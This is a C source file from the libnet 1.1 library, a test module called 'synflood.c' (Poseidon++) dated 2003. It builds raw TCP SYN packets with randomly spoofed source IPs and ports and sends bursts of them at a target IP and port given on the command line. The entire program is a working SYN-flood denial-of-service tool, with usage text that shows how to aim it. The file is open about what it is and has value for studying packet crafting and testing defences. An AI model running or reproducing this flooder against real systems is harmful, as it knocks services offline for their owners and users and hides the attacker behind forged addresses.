/*
 *  $Id: synflood.c,v 1.1.1.1 2003/06/26 21:55:11 route Exp $
 *
 *  Poseidon++ (c) 1996 - 2003 Mike D. Schiffman <mike@infonexus.com>
 *  SYN flooder rewritten for no good reason.  Again as libnet test module.
 *  Again for libnet 1.1.
 *  All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 */

#if (HAVE_CONFIG_H)
#include "../include/config.h"
#endif
#include "./libnet_test.h"

struct t_pack
{
    struct libnet_ipv4_hdr ip;
    struct libnet_tcp_hdr tcp;
};


int
main(int argc, char **argv)
{
    u_long dst_ip   = 0;
    u_long src_ip   = 0;
    u_short dst_prt = 0;
    u_short src_prt = 0;
    libnet_t *l;
    libnet_ptag_t t;
    char *cp;
    char errbuf[LIBNET_ERRBUF_SIZE];
    int i, c, packet_amt, burst_int, burst_amt, build_ip;

    packet_amt  = 0;
    burst_int   = 0;
    burst_amt   = 1;

    printf("libnet 1.1 syn flooding: TCP[raw]\n");

    /*
     *  Initialize the library.  Root priviledges are required.
     */
    l = libnet_init(
            LIBNET_RAW4,                            /* injection type */
            NULL,                                   /* network interface */
            errbuf);                                /* error buffer */

    if (l == NULL)
    {
        fprintf(stderr, "libnet_init() failed: %s", errbuf);
        exit(EXIT_FAILURE); 
    }

    while((c = getopt(argc, argv, "t:a:i:b:")) != EOF)
    {
        switch (c)
        {
            /*
             *  We expect the input to be of the form `ip.ip.ip.ip.port`.  We
             *  point cp to the last dot of the IP address/port string and
             *  then seperate them with a NULL byte.  The optarg now points to
             *  just the IP address, and cp points to the port.
             */
            case 't':
                if (!(cp = strrchr(optarg, '.')))
                {
                    usage(argv[0]);
                    exit(EXIT_FAILURE);
                }
                *cp++ = 0;
                dst_prt = (u_short)atoi(cp);
                if ((dst_ip = libnet_name2addr4(l, optarg, 1)) == -1)
                {
                    fprintf(stderr, "Bad IP address: %s\n", optarg);
                    exit(EXIT_FAILURE);
                }
                break;
            case 'a':
                packet_amt  = atoi(optarg);
                break;
            case 'i':
                burst_int   = atoi(optarg);
                break;
            case 'b':
                burst_amt   = atoi(optarg);
                break;
            default:
                usage(argv[0]);
                exit(EXIT_FAILURE);
        }
    }

    if (!dst_prt || !dst_ip || !packet_amt)
    {
        usage(argv[0]);
        exit(EXIT_FAILURE);
    }

    libnet_seed_prand(l);

    for(t = LIBNET_PTAG_INITIALIZER, build_ip = 1; burst_amt--;)
    {
        for (i = 0; i < packet_amt; i++)
        {
            t = libnet_build_tcp(
                    src_prt = libnet_get_prand(LIBNET_PRu16),
                    dst_prt,
                    libnet_get_prand(LIBNET_PRu32),
                    libnet_get_prand(LIBNET_PRu32),
                    TH_SYN,
                    libnet_get_prand(LIBNET_PRu16),
                    0,
                    0,
                    LIBNET_TCP_H,
                    NULL,
                    0,
                    l,
                    t);

            if (build_ip)
            {
                build_ip = 0;
                libnet_build_ipv4(
                    LIBNET_TCP_H + LIBNET_IPV4_H,
                    0,
                    libnet_get_prand(LIBNET_PRu16),
                    0,
                    libnet_get_prand(LIBNET_PR8),
                    IPPROTO_TCP,
                    0,
                    src_ip = libnet_get_prand(LIBNET_PRu32),
                    dst_ip,
                    NULL,
                    0,
                    l,
                    0);
            }
            c = libnet_write(l);
            if (c == -1)
            {
                fprintf(stderr, "libnet_write: %s\n", libnet_geterror(l));
            }
#if !(__WIN32__)
            usleep(250);
#else
            Sleep(250);
#endif

            printf("%15s:%5d ------> %15s:%5d\n", 
                    libnet_addr2name4(src_ip, 1),
                    ntohs(src_prt),
                    libnet_addr2name4(dst_ip, 1),
                    dst_prt);
        }
#if !(__WIN32__)
        sleep(burst_int);
#else
        Sleep(burst_int * 1000);
#endif
    }
    exit(EXIT_SUCCESS);
}


void
usage(char *nomenclature)
{
    fprintf(stderr,
        "\n\nusage: %s -t -a [-i -b]\n"
        "\t-t target, (ip.address.port: 192.168.2.6.23)\n"
        "\t-a number of packets to send per burst\n"
        "\t-i packet burst sending interval (defaults to 0)\n"
        "\t-b number packet bursts to send (defaults to 1)\n" , nomenclature);
}


/* EOF */
